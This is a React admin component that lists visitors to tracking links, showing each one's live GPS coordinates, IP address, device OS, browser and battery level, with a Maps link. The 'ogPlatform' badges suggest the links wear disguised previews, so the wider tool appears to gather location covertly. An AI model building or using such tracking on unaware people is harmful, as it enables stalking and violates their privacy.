// components/admin/LinkLocationGroupCard.tsx
"use client";

import React from "react";
import Link from "next/link";
import { Card } from "@/components/ui/Card";
import { Button } from "@/components/ui/Button";
import { Badge } from "@/components/ui/Badge";
import { Navigation, BarChart2 } from "lucide-react";
import { timeAgo } from "@/lib/utils";
import { LinkSummaryItem, LiveLocationItem } from "@/hooks/useRealtimeLocations";

interface LinkLocationGroupCardProps {
  link: LinkSummaryItem;
  locations: LiveLocationItem[];
}

export const LinkLocationGroupCard: React.FC<LinkLocationGroupCardProps> = ({
  link,
  locations,
}) => {
  return (
    <Card variant="glass" className="p-4 sm:p-5 space-y-3">
      {/* Link Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-white/10 pb-3">
        <div className="space-y-1">
          <div className="flex flex-wrap items-center gap-2">
            <h3 className="text-sm font-bold text-white">{link.title}</h3>
            <Badge
              variant="default"
              className="text-[10px] bg-[#FFFC00]/10 text-[#FFFC00] border-[#FFFC00]/30 font-bold"
            >
              {link.totalVisitors} {link.totalVisitors === 1 ? "Visitor" : "Visitors"}
            </Badge>
            {link.ogPlatform && link.ogPlatform !== "custom" && (
              <Badge variant="default" className="uppercase text-[10px] bg-white/10 text-white">
                {link.ogPlatform}
              </Badge>
            )}
          </div>
          {link.targetUrl && (
            <p className="text-xs text-white/50 font-mono truncate max-w-lg">
              {link.targetUrl}
            </p>
          )}
        </div>

        <Link href={`/admin/links/${link.id}`}>
          <Button size="sm" variant="secondary" className="gap-1.5 text-xs shrink-0">
            <BarChart2 className="w-3 h-3 text-[#FFFC00]" />
            Track Link
          </Button>
        </Link>
      </div>

      {/* Visitors under this link */}
      {locations.length === 0 ? (
        <p className="text-xs text-white/40 py-2">
          No active coordinates transmitted yet for this link.
        </p>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5 pt-1">
          {locations.map((loc) => {
            const gmapsUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
            const dev = loc.deviceInfo || {};
            const devSpecs = [dev.os, dev.browser, dev.battery !== undefined ? `${dev.battery}%` : null]
              .filter(Boolean)
              .join(" • ");

            return (
              <div
                key={loc.sessionId}
                className="p-3 rounded-2xl bg-white/5 border border-white/5 flex items-center justify-between gap-3 text-xs"
              >
                <div className="space-y-0.5 truncate">
                  <p className="font-mono text-[#FFFC00] font-bold truncate">
                    {loc.latitude.toFixed(5)}, {loc.longitude.toFixed(5)}
                  </p>
                  <p className="text-[11px] text-white/70 truncate">
                    {loc.ipAddress} {devSpecs ? `(${devSpecs})` : ""}
                  </p>
                  <p className="text-[10px] text-white/40">
                    Updated {timeAgo(loc.updatedAt)} • ±{Math.round(loc.accuracy || 0)}m
                  </p>
                </div>

                <a href={gmapsUrl} target="_blank" rel="noopener noreferrer" className="shrink-0">
                  <Button size="sm" className="text-[11px] py-1 px-2.5 gap-1">
                    <Navigation className="w-3 h-3" />
                    Maps ↗
                  </Button>
                </a>
              </div>
            );
          })}
        </div>
      )}
    </Card>
  );
};
